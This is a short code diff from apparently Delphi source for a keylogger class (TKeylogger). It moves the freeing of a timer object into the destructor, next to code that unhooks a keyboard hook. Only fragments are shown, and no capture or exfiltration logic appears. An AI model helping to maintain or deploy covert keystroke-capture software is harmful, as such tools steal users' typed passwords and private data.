@@ -88,6 +88,7 @@ end;
 destructor TKeylogger.Destroy;
 begin
   inherited;
+  FreeAndNil(TimerKey);
 end;
 
 procedure KeySaveToFile(keytext: string);
@@ -574,7 +575,7 @@ begin
       if TimerKey <> nil then
       begin
         TimerKey.Terminate;
-        FreeAndNil(TimerKey);
+
       end;
 
       UnhookWindowsHookEx(kHook);
